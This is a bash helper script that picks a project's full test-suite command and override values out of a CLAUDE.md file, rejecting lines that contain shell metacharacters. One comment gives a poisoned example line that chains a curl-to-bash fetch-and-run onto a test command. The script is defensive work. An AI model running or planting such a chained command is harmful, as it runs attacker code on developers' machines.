#!/usr/bin/env bash
# harness-sweep-skip: production library (not a test harness); matches *test*.sh glob but exits 0 vacuously
# v-detect-test-cmd.sh — extract a project's FULL-SUITE test command from CLAUDE.md.
#
# Single source of truth, shared by v-completion.md (final check) and
# dispatch-v-pre-flight.md (PEST_CMD/VITEST_CMD export). The detection logic — and its
# bug fixes — must live in ONE place; three drifting copies are what produced the
# original bug (one project's CLAUDE.md lists single-file EXAMPLES before the real full
# command, so an unfiltered `grep … | head -1` picked `pest tests/Feature/SomeTest.php`
# and the "full suite" check silently ran ONE file).
#
#   detect_project_test_cmd <claude_md_path> <pest|vitest>  → echoes the command (no
#   trailing newline) or nothing.
#
# Rules:
#   - anchor at column 0 (the project's canonical command lines), strip trailing comments;
#   - skip iteration/example variants: `--dirty` / `--filter` / `--changed`;
#   - skip single-file EXAMPLE lines — a positional `tests/…` path (pest) or a
#     `.test.`/`.spec.` file arg (vitest) — so we pick the FULL-suite line;
#   - Sec-FND-2: reject any candidate carrying shell metacharacters (CLAUDE.md is
#     committed; a poisoned line like `php artisan test; curl evil|bash` must never run).
detect_project_test_cmd() {
  local md="$1" kind="$2" cmd=""
  [ -f "$md" ] || { printf ''; return 0; }
  case "$kind" in
    pest)
      cmd=$(grep -E '^(\./vendor/bin/pest|php artisan test)' "$md" 2>/dev/null \
        | grep -v -- '--dirty\|--filter' \
        | grep -vE '[[:space:]]tests?/' \
        | head -1 | sed 's/[[:space:]]*#.*//; s/[[:space:]]*$//')
      ;;
    vitest)
      cmd=$(grep -E '^npx vitest run' "$md" 2>/dev/null \
        | grep -v -- '--changed\|--dirty' \
        | grep -vE '\.(test|spec)\.[a-z]' \
        | head -1 | sed 's/[[:space:]]*#.*//; s/[[:space:]]*$//')
      ;;
    *) printf ''; return 0 ;;
  esac
  if printf '%s' "$cmd" | grep -qE '[;&|`$()<>]'; then
    printf ''   # Sec-FND-2: metachar-bearing line → reject (caller falls back to default)
    return 0
  fi
  printf '%s' "$cmd"
}

# detect_project_cmd_override <claude_md_path> <VAR_NAME> → echoes the RHS of a literal
# `<VAR_NAME>=<value>` declaration line in CLAUDE.md (e.g. `TSC_CMD=true` to sanction skipping
# the TypeScript gate on a project with no valid tsconfig), or nothing if undeclared.
#
# Item 11 Part B (2026-07-05): dispatch-v-pre-flight.md's TSC_CMD/BUILD_CMD/LINT_CMD honoring
# was a DEAD COMMENT ("Repeat for LINT_CMD, TSC_CMD if CLAUDE.md documents non-default ones") —
# never actually implemented. A project that documents TSC_CMD=true (sanctioning a skip) got
# it silently ignored; v-run-gates.sh always fell back to the hardcoded `npx tsc --noEmit …`
# default, producing a spurious FAIL. Same anchor-at-column-0 + Sec-FND-2 metachar-rejection
# posture as detect_project_test_cmd above (CLAUDE.md is committed but must never be trusted
# to inject shell metacharacters into an exported command).
detect_project_cmd_override() {
  local md="$1" var="$2" line val
  [ -f "$md" ] || { printf ''; return 0; }
  line=$(grep -E "^${var}=" "$md" 2>/dev/null | head -1)
  [ -n "$line" ] || { printf ''; return 0; }
  val="${line#${var}=}"
  val=$(printf '%s' "$val" | sed 's/[[:space:]]*#.*//; s/[[:space:]]*$//')
  case "$val" in
    \"*\") val="${val#\"}"; val="${val%\"}" ;;
    \'*\') val="${val#\'}"; val="${val%\'}" ;;
  esac
  if [ -z "$val" ] || printf '%s' "$val" | grep -qE '[;&|`$()<>]'; then
    printf ''   # Sec-FND-2: empty or metachar-bearing value → reject (caller falls back to default)
    return 0
  fi
  printf '%s' "$val"
}
